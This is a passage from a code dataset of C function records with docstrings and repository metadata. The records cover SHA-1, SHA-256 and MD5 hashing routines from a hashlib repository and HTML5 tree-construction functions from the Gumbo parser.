FE(4); FT(4); FA(4); FB(4);\n    sha_info->digest[0] += E;\n    sha_info->digest[1] += T;\n    sha_info->digest[2] += A;\n    sha_info->digest[3] += B;\n    sha_info->digest[4] += C;\n#else /* !UNRAVEL */\n#ifdef UNROLL_LOOPS\n    FG(1); FG(1); FG(1); FG(1); FG(1); FG(1); FG(1); FG(1); FG(1); FG(1);\n    FG(1); FG(1); FG(1); FG(1); FG(1); FG(1); FG(1); FG(1); FG(1); FG(1);\n    FG(2); FG(2); FG(2); FG(2); FG(2); FG(2); FG(2); FG(2); FG(2); FG(2);\n    FG(2); FG(2); FG(2); FG(2); FG(2); FG(2); FG(2); FG(2); FG(2); FG(2);\n    FG(3); FG(3); FG(3); FG(3); FG(3); FG(3); FG(3); FG(3); FG(3); FG(3);\n    FG(3); FG(3); FG(3); FG(3); FG(3); FG(3); FG(3); FG(3); FG(3); FG(3);\n    FG(4); FG(4); FG(4); FG(4); FG(4); FG(4); FG(4); FG(4); FG(4); FG(4);\n    FG(4); FG(4); FG(4); FG(4); FG(4); FG(4); FG(4); FG(4); FG(4); FG(4);\n#else /* !UNROLL_LOOPS */\n    for (i =  0; i < 20; ++i) { FG(1); }\n    for (i = 20; i < 40; ++i) { FG(2); }\n    for (i = 40; i < 60; ++i) { FG(3); }\n    for (i = 60; i < 80; ++i) { FG(4); }\n#endif /* !UNROLL_LOOPS */\n    sha_info->digest[0] += A;\n    sha_info->digest[1] += B;\n    sha_info->digest[2] += C;\n    sha_info->digest[3] += D;\n    sha_info->digest[4] += E;\n#endif /* !UNRAVEL */\n}", "path": "lib\\sha\\shamodule.c", "repo_name": "brainpicture/hashlib", "stars": 166, "license": "None", "language": "c", "size": 677}
{"docstring": "/* finish computing the SHA digest */\n", "func_signal": "static void\nsha_final(unsigned char digest[20], SHAobject *sha_info)", "code": "{\n    int count;\n    SHA_INT32 lo_bit_count, hi_bit_count;\n\n    lo_bit_count = sha_info->count_lo;\n    hi_bit_count = sha_info->count_hi;\n    count = (int) ((lo_bit_count >> 3) & 0x3f);\n    ((SHA_BYTE *) sha_info->data)[count++] = 0x80;\n    if (count > SHA_BLOCKSIZE - 8) {\n\tmemset(((SHA_BYTE *) sha_info->data) + count, 0,\n\t       SHA_BLOCKSIZE - count);\n\tsha_transform(sha_info);\n\tmemset((SHA_BYTE *) sha_info->data, 0, SHA_BLOCKSIZE - 8);\n    }\n    else {\n\tmemset(((SHA_BYTE *) sha_info->data) + count, 0,\n\t       SHA_BLOCKSIZE - 8 - count);\n    }\n\n    /* GJS: note that we add the hi/lo in big-endian. sha_transform will\n       swap these values into host-order. */\n    sha_info->data[56] = (hi_bit_count >> 24) & 0xff;\n    sha_info->data[57] = (hi_bit_count >> 16) & 0xff;\n    sha_info->data[58] = (hi_bit_count >>  8) & 0xff;\n    sha_info->data[59] = (hi_bit_count >>  0) & 0xff;\n    sha_info->data[60] = (lo_bit_count >> 24) & 0xff;\n    sha_info->data[61] = (lo_bit_count >> 16) & 0xff;\n    sha_info->data[62] = (lo_bit_count >>  8) & 0xff;\n    sha_info->data[63] = (lo_bit_count >>  0) & 0xff;\n    sha_transform(sha_info);\n    digest[ 0] = (unsigned char) ((sha_info->digest[0] >> 24) & 0xff);\n    digest[ 1] = (unsigned char) ((sha_info->digest[0] >> 16) & 0xff);\n    digest[ 2] = (unsigned char) ((sha_info->digest[0] >>  8) & 0xff);\n    digest[ 3] = (unsigned char) ((sha_info->digest[0]      ) & 0xff);\n    digest[ 4] = (unsigned char) ((sha_info->digest[1] >> 24) & 0xff);\n    digest[ 5] = (unsigned char) ((sha_info->digest[1] >> 16) & 0xff);\n    digest[ 6] = (unsigned char) ((sha_info->digest[1] >>  8) & 0xff);\n    digest[ 7] = (unsigned char) ((sha_info->digest[1]      ) & 0xff);\n    digest[ 8] = (unsigned char) ((sha_info->digest[2] >> 24) & 0xff);\n    digest[ 9] = (unsigned char) ((sha_info->digest[2] >> 16) & 0xff);\n    digest[10] = (unsigned char) ((sha_info->digest[2] >>  8) & 0xff);\n    digest[11] = (unsigned char) ((sha_info->digest[2]      ) & 0xff);\n    digest[12] = (unsigned char) ((sha_info->digest[3] >> 24) & 0xff);\n    digest[13] = (unsigned char) ((sha_info->digest[3] >> 16) & 0xff);\n    digest[14] = (unsigned char) ((sha_info->digest[3] >>  8) & 0xff);\n    digest[15] = (unsigned char) ((sha_info->digest[3]      ) & 0xff);\n    digest[16] = (unsigned char) ((sha_info->digest[4] >> 24) & 0xff);\n    digest[17] = (unsigned char) ((sha_info->digest[4] >> 16) & 0xff);\n    digest[18] = (unsigned char) ((sha_info->digest[4] >>  8) & 0xff);\n    digest[19] = (unsigned char) ((sha_info->digest[4]      ) & 0xff);\n}", "path": "lib\\sha\\shamodule.c", "repo_name": "brainpicture/hashlib", "stars": 166, "license": "None", "language": "c", "size": 677}
{"docstring": "/* Default number of rounds                                    */\n/* (as a function of digest size d and keylen                  */\n", "func_signal": "int md6_default_r( int d ,\n                   int keylen )", "code": "{ int r;\n  /* Default number of rounds is forty plus floor(d/4) */\n  r = 40 + (d/4);\n  /* unless keylen > 0, in which case it must be >= 80 as well */\n  if (keylen>0)\n    r = max(80,r);\n  return r;\n}", "path": "lib\\md6\\md6_mode.c", "repo_name": "brainpicture/hashlib", "stars": 166, "license": "None", "language": "c", "size": 677}
{"docstring": "/* initialize the SHA digest */\n", "func_signal": "static void\nsha_init(SHAobject *sha_info)", "code": "{\n    TestEndianness(sha_info->Endianness)\n\n    sha_info->digest[0] = 0x67452301L;\n    sha_info->digest[1] = 0xefcdab89L;\n    sha_info->digest[2] = 0x98badcfeL;\n    sha_info->digest[3] = 0x10325476L;\n    sha_info->digest[4] = 0xc3d2e1f0L;\n    sha_info->count_lo = 0L;\n    sha_info->count_hi = 0L;\n    sha_info->local = 0;\n}", "path": "lib\\sha\\shamodule.c", "repo_name": "brainpicture/hashlib", "stars": 166, "license": "None", "language": "c", "size": 677}
{"docstring": "/*\n * Decodes input (unsigned char) into output (u_int32_t). Assumes len is\n * a multiple of 4.\n */\n", "func_signal": "static void\nDecode (u_int32_t *output, const unsigned char *input, unsigned int len)", "code": "{\n\tunsigned int i;\n\tconst u_int32_t *ip = (const u_int32_t *)input;\n\n\tfor (i = 0; i < len / 4; i++)\n\t\toutput[i] = le32toh(ip[i]);\n}", "path": "libhash\\md5c.c", "repo_name": "brainpicture/hashlib", "stars": 166, "license": "None", "language": "c", "size": 677}
{"docstring": "/* When run on a little-endian CPU we need to perform byte reversal on an\n   array of longwords. */\n", "func_signal": "static void longReverse(SHA_INT32 *buffer, int byteCount, int Endianness)", "code": "{\n    SHA_INT32 value;\n\n    if ( Endianness == PCT_BIG_ENDIAN )\n\treturn;\n\n    byteCount /= sizeof(*buffer);\n    while (byteCount--) {\n        value = *buffer;\n        value = ( ( value & 0xFF00FF00L ) >> 8  ) | \\\n                ( ( value & 0x00FF00FFL ) << 8 );\n        *buffer++ = ( value << 16 ) | ( value >> 16 );\n    }\n}", "path": "lib\\sha\\sha256module.c", "repo_name": "brainpicture/hashlib", "stars": 166, "license": "None", "language": "c", "size": 677}
{"docstring": "/* When run on a little-endian CPU we need to perform byte reversal on an\n   array of longwords. */\n", "func_signal": "static void longReverse(SHA_INT32 *buffer, int byteCount, int Endianness)", "code": "{\n    SHA_INT32 value;\n\n    if ( Endianness == PCT_BIG_ENDIAN )\n\treturn;\n\n    byteCount /= sizeof(*buffer);\n    while (byteCount--) {\n        value = *buffer;\n        value = ( ( value & 0xFF00FF00L ) >> 8  ) | \\\n                ( ( value & 0x00FF00FFL ) << 8 );\n        *buffer++ = ( value << 16 ) | ( value >> 16 );\n    }\n}", "path": "lib\\sha\\shamodule.c", "repo_name": "brainpicture/hashlib", "stars": 166, "license": "None", "language": "c", "size": 677}
{"docstring": "/*\n * Decode a big-endian length len vector of (unsigned char) into a length\n * len/4 vector of (uint32_t).  Assumes len is a multiple of 4.\n */\n", "func_signal": "static void\nbe32dec_vect(uint32_t *dst, const unsigned char *src, size_t len)", "code": "{\n\tsize_t i;\n\n\tfor (i = 0; i < len / 4; i++)\n\t\tdst[i] = be32dec(src + i * 4);\n}", "path": "libhash\\sha256c.c", "repo_name": "brainpicture/hashlib", "stars": 166, "license": "None", "language": "c", "size": 677}
{"docstring": "/* Initialize this module. */\n", "func_signal": "PyMODINIT_FUNC\ninit_hashlib(void)", "code": "{\n    PyObject *m;\n\n    OpenSSL_add_all_digests();\n\n    /* TODO build EVP_functions openssl_* entries dynamically based\n     * on what hashes are supported rather than listing many\n     * but having some be unsupported.  Only init appropriate\n     * constants. */\n\n    EVPtype.ob_type = &PyType_Type;\n    if (PyType_Ready(&EVPtype) < 0)\n        return;\n\n    m = Py_InitModule(\"_hashlib\", EVP_functions);\n    if (m == NULL)\n        return;\n\n#if HASH_OBJ_CONSTRUCTOR\n    Py_INCREF(&EVPtype);\n    PyModule_AddObject(m, \"HASH\", (PyObject *)&EVPtype);\n#endif\n\n    /* these constants are used by the convenience constructors */\n    INIT_CONSTRUCTOR_CONSTANTS(md5);\n    INIT_CONSTRUCTOR_CONSTANTS(sha1);\n    INIT_CONSTRUCTOR_CONSTANTS(sha224);\n    INIT_CONSTRUCTOR_CONSTANTS(sha256);\n    INIT_CONSTRUCTOR_CONSTANTS(sha384);\n    INIT_CONSTRUCTOR_CONSTANTS(sha512);\n}", "path": "lib\\md5\\_hashopenssl.c", "repo_name": "brainpicture/hashlib", "stars": 166, "license": "None", "language": "c", "size": 677}
{"docstring": "/* finish computing the SHA digest */\n", "func_signal": "static void\nsha_final(unsigned char digest[32], SHAobject *sha_info)", "code": "{\n    int count;\n    SHA_INT32 lo_bit_count, hi_bit_count;\n\n    lo_bit_count = sha_info->count_lo;\n    hi_bit_count = sha_info->count_hi;\n    count = (int) ((lo_bit_count >> 3) & 0x3f);\n    ((SHA_BYTE *) sha_info->data)[count++] = 0x80;\n    if (count > SHA_BLOCKSIZE - 8) {\n\tmemset(((SHA_BYTE *) sha_info->data) + count, 0,\n\t       SHA_BLOCKSIZE - count);\n\tsha_transform(sha_info);\n\tmemset((SHA_BYTE *) sha_info->data, 0, SHA_BLOCKSIZE - 8);\n    }\n    else {\n\tmemset(((SHA_BYTE *) sha_info->data) + count, 0,\n\t       SHA_BLOCKSIZE - 8 - count);\n    }\n\n    /* GJS: note that we add the hi/lo in big-endian. sha_transform will\n       swap these values into host-order. */\n    sha_info->data[56] = (hi_bit_count >> 24) & 0xff;\n    sha_info->data[57] = (hi_bit_count >> 16) & 0xff;\n    sha_info->data[58] = (hi_bit_count >>  8) & 0xff;\n    sha_info->data[59] = (hi_bit_count >>  0) & 0xff;\n    sha_info->data[60] = (lo_bit_count >> 24) & 0xff;\n    sha_info->data[61] = (lo_bit_count >> 16) & 0xff;\n    sha_info->data[62] = (lo_bit_count >>  8) & 0xff;\n    sha_info->data[63] = (lo_bit_count >>  0) & 0xff;\n    sha_transform(sha_info);\n    digest[ 0] = (unsigned char) ((sha_info->digest[0] >> 24) & 0xff);\n    digest[ 1] = (unsigned char) ((sha_info->digest[0] >> 16) & 0xff);\n    digest[ 2] = (unsigned char) ((sha_info->digest[0] >>  8) & 0xff);\n    digest[ 3] = (unsigned char) ((sha_info->digest[0]      ) & 0xff);\n    digest[ 4] = (unsigned char) ((sha_info->digest[1] >> 24) & 0xff);\n    digest[ 5] = (unsigned char) ((sha_info->digest[1] >> 16) & 0xff);\n    digest[ 6] = (unsigned char) ((sha_info->digest[1] >>  8) & 0xff);\n    digest[ 7] = (unsigned char) ((sha_info->digest[1]      ) & 0xff);\n    digest[ 8] = (unsigned char) ((sha_info->digest[2] >> 24) & 0xff);\n    digest[ 9] = (unsigned char) ((sha_info->digest[2] >> 16) & 0xff);\n    digest[10] = (unsigned char) ((sha_info->digest[2] >>  8) & 0xff);\n    digest[11] = (unsigned char) ((sha_info->digest[2]      ) & 0xff);\n    digest[12] = (unsigned char) ((sha_info->digest[3] >> 24) & 0xff);\n    digest[13] = (unsigned char) ((sha_info->digest[3] >> 16) & 0xff);\n    digest[14] = (unsigned char) ((sha_info->digest[3] >>  8) & 0xff);\n    digest[15] = (unsigned char) ((sha_info->digest[3]      ) & 0xff);\n    digest[16] = (unsigned char) ((sha_info->digest[4] >> 24) & 0xff);\n    digest[17] = (unsigned char) ((sha_info->digest[4] >> 16) & 0xff);\n    digest[18] = (unsigned char) ((sha_info->digest[4] >>  8) & 0xff);\n    digest[19] = (unsigned char) ((sha_info->digest[4]      ) & 0xff);\n    digest[20] = (unsigned char) ((sha_info->digest[5] >> 24) & 0xff);\n    digest[21] = (unsigned char) ((sha_info->digest[5] >> 16) & 0xff);\n    digest[22] = (unsigned char) ((sha_info->digest[5] >>  8) & 0xff);\n    digest[23] = (unsigned char) ((sha_info->digest[5]      ) & 0xff);\n    digest[24] = (unsigned char) ((sha_info->digest[6] >> 24) & 0xff);\n    digest[25] = (unsigned char) ((sha_info->digest[6] >> 16) & 0xff);\n    digest[26] = (unsigned char) ((sha_info->digest[6] >>  8) & 0xff);\n    digest[27] = (unsigned char) ((sha_info->digest[6]      ) & 0xff);\n    digest[28] = (unsigned char) ((sha_info->digest[7] >> 24) & 0xff);\n    digest[29] = (unsigned char) ((sha_info->digest[7] >> 16) & 0xff);\n    digest[30] = (unsigned char) ((sha_info->digest[7] >>  8) & 0xff);\n    digest[31] = (unsigned char) ((sha_info->digest[7]      ) & 0xff);\n}", "path": "lib\\sha\\sha256module.c", "repo_name": "brainpicture/hashlib", "stars": 166, "license": "None", "language": "c", "size": 677}
{"docstring": "/* Internal methods for a hash object */\n", "func_signal": "static void\nEVP_dealloc(PyObject *ptr)", "code": "{\n    EVP_MD_CTX_cleanup(&((EVPobject *)ptr)->ctx);\n    Py_XDECREF(((EVPobject *)ptr)->name);\n    PyObject_Del(ptr);\n}", "path": "lib\\md5\\_hashopenssl.c", "repo_name": "brainpicture/hashlib", "stars": 166, "license": "None", "language": "c", "size": 677}
{"docstring": "/*\n * SHA-256 finalization.  Pads the input data, exports the hash value,\n * and clears the context state.\n */\n", "func_signal": "void\nSHA256_Final(unsigned char digest[32], SHA256_CTX * ctx)", "code": "{\n\n\t/* Add padding */\n\tSHA256_Pad(ctx);\n\n\t/* Write the hash */\n\tbe32enc_vect(digest, ctx->state, 32);\n\n\t/* Clear the context state */\n\tmemset((void *)ctx, 0, sizeof(*ctx));\n}", "path": "libhash\\sha256c.c", "repo_name": "brainpicture/hashlib", "stars": 166, "license": "None", "language": "c", "size": 677}
{"docstring": "/*\n * Encodes input (u_int32_t) into output (unsigned char). Assumes len is\n * a multiple of 4.\n */\n", "func_signal": "static void\nEncode (unsigned char *output, u_int32_t *input, unsigned int len)", "code": "{\n\tunsigned int i;\n\tu_int32_t *op = (u_int32_t *)output;\n\n\tfor (i = 0; i < len / 4; i++)\n\t\top[i] = htole32(input[i]);\n}", "path": "libhash\\md5c.c", "repo_name": "brainpicture/hashlib", "stars": 166, "license": "None", "language": "c", "size": 677}
{"docstring": "/* initialize the SHA digest */\n", "func_signal": "static void\nsha_init(SHAobject *sha_info)", "code": "{\n    TestEndianness(sha_info->Endianness)\n    sha_info->digest[0] = 0x6A09E667L;\n    sha_info->digest[1] = 0xBB67AE85L;\n    sha_info->digest[2] = 0x3C6EF372L;\n    sha_info->digest[3] = 0xA54FF53AL;\n    sha_info->digest[4] = 0x510E527FL;\n    sha_info->digest[5] = 0x9B05688CL;\n    sha_info->digest[6] = 0x1F83D9ABL;\n    sha_info->digest[7] = 0x5BE0CD19L;\n    sha_info->count_lo = 0L;\n    sha_info->count_hi = 0L;\n    sha_info->local = 0;\n    sha_info->digestsize = 32;\n}", "path": "lib\\sha\\sha256module.c", "repo_name": "brainpicture/hashlib", "stars": 166, "license": "None", "language": "c", "size": 677}
{"docstring": "// Returns true if the specified token is either a start or end tag (specified\n// by is_start) with one of the tag types in the varargs list.  Terminate the\n// list with GUMBO_TAG_LAST; this functions as a sentinel since no portion of\n// the spec references tags that are not in the spec.\n// TODO(jdtang): A lot of the tag lists for this function are repeated in many\n// places in the code.  This is how it's written in the spec (and it's done this\n// way so it's easy to verify the code against the spec), but it may be worth\n// coming up with a notion of a \"tag set\" that includes a list of tags, and\n// using that in many places.  It'd probably also help performance, but I want\n// to profile before optimizing.\n", "func_signal": "static bool tag_in(const GumboToken* token, bool is_start, ...)", "code": "{\n  GumboTag token_tag;\n  if (is_start && token->type == GUMBO_TOKEN_START_TAG) {\n    token_tag = token->v.start_tag.tag;\n  } else if (!is_start && token->type == GUMBO_TOKEN_END_TAG) {\n    token_tag = token->v.end_tag;\n  } else {\n    return false;\n  }\n\n  va_list tags;\n  va_start(tags, is_start);\n  bool result = false;\n  for (GumboTag tag = va_arg(tags, GumboTag); tag != GUMBO_TAG_LAST;\n       tag = va_arg(tags, GumboTag)) {\n    if (tag == token_tag) {\n      result = true;\n      break;\n    }\n  }\n  va_end(tags);\n  return result;\n}", "path": "zeteswings\\src\\cpp\\litehtml\\gumbo\\parser.c", "repo_name": "bigfatbrowncat/zetes", "stars": 207, "license": "None", "language": "c", "size": 103499}
{"docstring": "// Counts the number of open formatting elements in the list of active\n// formatting elements (after the last active scope marker) that have a specific\n// tag.  If this is > 0, then earliest_matching_index will be filled in with the\n// index of the first such element.\n", "func_signal": "static int count_formatting_elements_of_tag(\n    GumboParser* parser, const GumboNode* desired_node,\n    int* earliest_matching_index)", "code": "{\n  const GumboElement* desired_element = &desired_node->v.element;\n  GumboVector* elements = &parser->_parser_state->_active_formatting_elements;\n  int num_identical_elements = 0;\n  for (int i = elements->length; --i >= 0; ) {\n    GumboNode* node = elements->data[i];\n    if (node == &kActiveFormattingScopeMarker) {\n      break;\n    }\n    assert(node->type == GUMBO_NODE_ELEMENT);\n    GumboElement* element = &node->v.element;\n    if (node_tag_is(node, desired_element->tag) &&\n        element->tag_namespace == desired_element->tag_namespace &&\n        all_attributes_match(&element->attributes,\n                             &desired_element->attributes)) {\n      num_identical_elements++;\n      *earliest_matching_index = i;\n    }\n  }\n  return num_identical_elements;\n}", "path": "zeteswings\\src\\cpp\\litehtml\\gumbo\\parser.c", "repo_name": "bigfatbrowncat/zetes", "stars": 207, "license": "None", "language": "c", "size": 103499}
{"docstring": "// Clones attributes, tags, etc. of a node, but does not copy the content.  The\n// clone shares no structure with the original node: all owned strings and\n// values are fresh copies.\n", "func_signal": "GumboNode* clone_node(\n    GumboParser* parser, const GumboNode* node, GumboParseFlags reason)", "code": "{\n  assert(node->type == GUMBO_NODE_ELEMENT);\n  GumboNode* new_node = gumbo_parser_allocate(parser, sizeof(GumboNode));\n  *new_node = *node;\n  new_node->parent = NULL;\n  new_node->index_within_parent = -1;\n  // Clear the GUMBO_INSERTION_IMPLICIT_END_TAG flag, as the cloned node may\n  // have a separate end tag.\n  new_node->parse_flags &= ~GUMBO_INSERTION_IMPLICIT_END_TAG;\n  new_node->parse_flags |= reason | GUMBO_INSERTION_BY_PARSER;\n  GumboElement* element = &new_node->v.element;\n  gumbo_vector_init(parser, 1, &element->children);\n\n  const GumboVector* old_attributes = &node->v.element.attributes;\n  gumbo_vector_init(parser, old_attributes->length, &element->attributes);\n  for (int i = 0; i < old_attributes->length; ++i) {\n    const GumboAttribute* old_attr = old_attributes->data[i];\n    GumboAttribute* attr =\n        gumbo_parser_allocate(parser, sizeof(GumboAttribute));\n    *attr = *old_attr;\n    attr->name = gumbo_copy_stringz(parser, old_attr->name);\n    attr->value = gumbo_copy_stringz(parser, old_attr->value);\n    gumbo_vector_add(parser, attr, &element->attributes);\n  }\n  return new_node;\n}", "path": "zeteswings\\src\\cpp\\litehtml\\gumbo\\parser.c", "repo_name": "bigfatbrowncat/zetes", "stars": 207, "license": "None", "language": "c", "size": 103499}
{"docstring": "// Convenience method for creating foreign namespaced element.  Returns the node\n// inserted.\n", "func_signal": "static GumboNode* insert_foreign_element(\n    GumboParser* parser, GumboToken* token, GumboNamespaceEnum tag_namespace)", "code": "{\n  assert(token->type == GUMBO_TOKEN_START_TAG);\n  GumboNode* element = create_element_from_token(parser, token, tag_namespace);\n  insert_element(parser, element, false);\n  if (token_has_attribute(token, \"xmlns\") &&\n      !attribute_matches_case_sensitive(\n          &token->v.start_tag.attributes, \"xmlns\",\n          kLegalXmlns[tag_namespace])) {\n    // TODO(jdtang): Since there're multiple possible error codes here, we\n    // eventually need reason codes to differentiate them.\n    parser_add_parse_error(parser, token);\n  }\n  if (token_has_attribute(token, \"xmlns:xlink\") &&\n      !attribute_matches_case_sensitive(\n          &token->v.start_tag.attributes,\n          \"xmlns:xlink\", \"http://www.w3.org/1999/xlink\")) {\n    parser_add_parse_error(parser, token);\n  }\n  return element;\n}", "path": "zeteswings\\src\\cpp\\litehtml\\gumbo\\parser.c", "repo_name": "bigfatbrowncat/zetes", "stars": 207, "license": "None", "language": "c", "size": 103499}
{"docstring": "// Like tag_in, but checks for the tag of a node, rather than a token.\n", "func_signal": "static bool node_tag_in(const GumboNode* node, ...)", "code": "{\n  assert(node != NULL);\n  if (node->type != GUMBO_NODE_ELEMENT) {\n    return false;\n  }\n  GumboTag node_tag = node->v.element.tag;\n\n  va_list tags;\n  va_start(tags, node);\n  bool result = false;\n  for (GumboTag tag = va_arg(tags, GumboTag); tag != GUMBO_TAG_LAST;\n       tag = va_arg(tags, GumboTag)) {\n    assert(tag <= GUMBO_TAG_LAST);\n    if (tag == node_tag) {\n      result = true;\n      break;\n    }\n  }\n  va_end(tags);\n  return result;\n}", "path": "zeteswings\\src\\cpp\\litehtml\\gumbo\\parser.c", "repo_name": "bigfatbrowncat/zetes", "stars": 207, "license": "None", "language": "c", "size": 103499}
{"docstring": "// http://www.whatwg.org/specs/web-apps/current-work/complete/tokenization.html#adjust-mathml-attributes\n// Note that this may destructively modify the token with the new attribute\n// value.\n", "func_signal": "static void adjust_mathml_attributes(GumboParser* parser, GumboToken* token)", "code": "{\n  assert(token->type == GUMBO_TOKEN_START_TAG);\n  GumboAttribute* attr = gumbo_get_attribute(\n      &token->v.start_tag.attributes, \"definitionurl\");\n  if (!attr) {\n    return;\n  }\n  gumbo_parser_deallocate(parser, (void*) attr->name);\n  attr->name = gumbo_copy_stringz(parser, \"definitionURL\");\n}", "path": "zeteswings\\src\\cpp\\litehtml\\gumbo\\parser.c", "repo_name": "bigfatbrowncat/zetes", "stars": 207, "license": "None", "language": "c", "size": 103499}
{"docstring": "// http://www.whatwg.org/specs/web-apps/current-work/multipage/tree-construction.html#adjust-foreign-attributes\n// This destructively modifies any matching attributes on the token and sets the\n// namespace appropriately.\n", "func_signal": "static void adjust_foreign_attributes(GumboParser* parser, GumboToken* token)", "code": "{\n  assert(token->type == GUMBO_TOKEN_START_TAG);\n  const GumboVector* attributes = &token->v.start_tag.attributes;\n  for (int i = 0;\n       i < sizeof(kForeignAttributeReplacements) /\n       sizeof(NamespacedAttributeReplacement); ++i) {\n    const NamespacedAttributeReplacement* entry =\n        &kForeignAttributeReplacements[i];\n    GumboAttribute* attr = gumbo_get_attribute(attributes, entry->from);\n    if (!attr) {\n      continue;\n    }\n    gumbo_parser_deallocate(parser, (void*) attr->name);\n    attr->attr_namespace = entry->attr_namespace;\n    attr->name = gumbo_copy_stringz(parser, entry->local_name);\n  }\n}", "path": "zeteswings\\src\\cpp\\litehtml\\gumbo\\parser.c", "repo_name": "bigfatbrowncat/zetes", "stars": 207, "license": "None", "language": "c", "size": 103499}
{"docstring": "// http://www.whatwg.org/specs/web-apps/current-work/complete/tokenization.html#parsing-main-incdata\n", "func_signal": "static bool handle_text(GumboParser* parser, GumboToken* token)", "code": "{\n  if (token->type == GUMBO_TOKEN_CHARACTER || token->type == GUMBO_TOKEN_WHITESPACE) {\n    insert_text_token(parser, token);\n  } else {\n    // We provide only bare-bones script handling that doesn't involve any of\n    // the parser-pause/already-started/script-nesting flags or re-entrant\n    // invocations of the tokenizer.  Because the intended usage of this library\n    // is mostly for templating, refactoring, and static-analysis libraries, we\n    // provide the script body as a text-node child of the <script> element.\n    // This behavior doesn't support document.write of partial HTML elements,\n    // but should be adequate for almost all other scripting support.\n    if (token->type == GUMBO_TOKEN_EOF) {\n      parser_add_parse_error(parser, token);\n      parser->_parser_state->_reprocess_current_token = true;\n    }\n    pop_current_node(parser);\n    set_insertion_mode(parser, parser->_parser_state->_original_insertion_mode);\n  }\n  return true;\n}", "path": "zeteswings\\src\\cpp\\litehtml\\gumbo\\parser.c", "repo_name": "bigfatbrowncat/zetes", "stars": 207, "license": "None", "language": "c", "size": 103499}
{"docstring": "// http://www.whatwg.org/specs/web-apps/current-work/complete/tokenization.html#parsing-main-inhead\n", "func_signal": "static bool handle_in_head(GumboParser* parser, GumboToken* token)", "code": "{\n  if (token->type == GUMBO_TOKEN_WHITESPACE) {\n    insert_text_token(parser, token);\n    return true;\n  } else if (token->type == GUMBO_TOKEN_DOCTYPE) {\n    parser_add_parse_error(parser, token);\n    ignore_token(parser);\n    return false;\n  } else if (token->type == GUMBO_TOKEN_COMMENT) {\n    append_comment_node(parser, get_current_node(parser), token);\n    return true;\n  } else if (tag_is(token, kStartTag, GUMBO_TAG_HTML)) {\n    return handle_in_body(parser, token);\n  } else if (tag_in(token, kStartTag, GUMBO_TAG_BASE, GUMBO_TAG_BASEFONT,\n                    GUMBO_TAG_BGSOUND, GUMBO_TAG_MENUITEM, GUMBO_TAG_LINK,\n                    GUMBO_TAG_LAST)) {\n    insert_element_from_token(parser, token);\n    pop_current_node(parser);\n    acknowledge_self_closing_tag(parser);\n    return true;\n  } else if (tag_is(token, kStartTag, GUMBO_TAG_META)) {\n    insert_element_from_token(parser, token);\n    pop_current_node(parser);\n    acknowledge_self_closing_tag(parser);\n    // NOTE(jdtang): Gumbo handles only UTF-8, so the encoding clause of the\n    // spec doesn't apply.  If clients want to handle meta-tag re-encoding, they\n    // should specifically look for that string in the document and re-encode it\n    // before passing to Gumbo.\n    return true;\n  } else if (tag_is(token, kStartTag, GUMBO_TAG_TITLE)) {\n    run_generic_parsing_algorithm(parser, token, GUMBO_LEX_RCDATA);\n    return true;\n  } else if (tag_in(token, kStartTag, GUMBO_TAG_NOFRAMES, GUMBO_TAG_STYLE,\n                    GUMBO_TAG_LAST)) {\n    run_generic_parsing_algorithm(parser, token, GUMBO_LEX_RAWTEXT);\n    return true;\n  } else if (tag_is(token, kStartTag, GUMBO_TAG_NOSCRIPT)) {\n    insert_element_from_token(parser, token);\n    set_insertion_mode(parser, GUMBO_INSERTION_MODE_IN_HEAD_NOSCRIPT);\n    return true;\n  } else if (tag_is(token, kStartTag, GUMBO_TAG_SCRIPT)) {\n    run_generic_parsing_algorithm(parser, token, GUMBO_LEX_SCRIPT);\n    return true;\n  } else if (tag_is(token, kEndTag, GUMBO_TAG_HEAD)) {\n    GumboNode* head = pop_current_node(parser);\n    AVOID_UNUSED_VARIABLE_WARNING(head);\n    assert(node_tag_is(head, GUMBO_TAG_HEAD));\n    set_insertion_mode(parser, GUMBO_INSERTION_MODE_AFTER_HEAD);\n    return true;\n  } else if (tag_is(token, kStartTag, GUMBO_TAG_HEAD)) {\n    parser_add_parse_error(parser, token);\n    ignore_token(parser);\n    return false;\n  } else if (tag_is(token, kStartTag, GUMBO_TAG_HEAD) ||\n             (token->type == GUMBO_TOKEN_END_TAG &&\n              !tag_in(token, kEndTag, GUMBO_TAG_BODY, GUMBO_TAG_HTML,\n                      GUMBO_TAG_BR, GUMBO_TAG_LAST))) {\n    parser_add_parse_error(parser, token);\n    return false;\n  } else if (tag_is(token, kStartTag, GUMBO_TAG_UNKNOWN) && token->v.start_tag.is_self_closing) {\n    parser_add_parse_error(parser, token);\n    ignore_token(parser);\n    return false;\n  } else {\n    const GumboNode* node = pop_current_node(parser);\n    assert(node_tag_is(node, GUMBO_TAG_HEAD));\n    AVOID_UNUSED_VARIABLE_WARNING(node);\n    set_insertion_mode(parser, GUMBO_INSERTION_MODE_AFTER_HEAD);\n    parser->_parser_state->_reprocess_current_token = true;\n    return true;\n  }\n\n  return true;\n}", "path": "zeteswings\\src\\cpp\\litehtml\\gumbo\\parser.c", "repo_name": "bigfatbrowncat/zetes", "stars": 207, "license": "None", "language": "c", "size": 103499}
{"docstring": "// http://www.whatwg.org/specs/web-apps/current-work/complete/tokenization.html#parsing-main-inselect\n", "func_signal": "static bool handle_in_select(GumboParser* parser, GumboToken* token)", "code": "{\n  if (token->type == GUMBO_TOKEN_NULL) {\n    parser_add_parse_error(parser, token);\n    ignore_token(parser);\n    return false;\n  } else if (token->type == GUMBO_TOKEN_CHARACTER ||\n             token->type == GUMBO_TOKEN_WHITESPACE) {\n    insert_text_token(parser, token);\n    return true;\n  } else if (token->type == GUMBO_TOKEN_DOCTYPE) {\n    parser_add_parse_error(parser, token);\n    ignore_token(parser);\n    return false;\n  } else if (token->type == GUMBO_TOKEN_COMMENT) {\n    append_comment_node(parser, get_current_node(parser), token);\n    return true;\n  } else if (tag_is(token, kStartTag, GUMBO_TAG_HTML)) {\n    return handle_in_body(parser, token);\n  } else if (tag_is(token, kStartTag, GUMBO_TAG_OPTION)) {\n    if (node_tag_is(get_current_node(parser), GUMBO_TAG_OPTION)) {\n      pop_current_node(parser);\n    }\n    insert_element_from_token(parser, token);\n    return true;\n  } else if (tag_is(token, kStartTag, GUMBO_TAG_OPTGROUP)) {\n    if (node_tag_is(get_current_node(parser), GUMBO_TAG_OPTION)) {\n      pop_current_node(parser);\n    }\n    if (node_tag_is(get_current_node(parser), GUMBO_TAG_OPTGROUP)) {\n      pop_current_node(parser);\n    }\n    insert_element_from_token(parser, token);\n    return true;\n  } else if (tag_is(token, kEndTag, GUMBO_TAG_OPTGROUP)) {\n    GumboVector* open_elements = &parser->_parser_state->_open_elements;\n    if 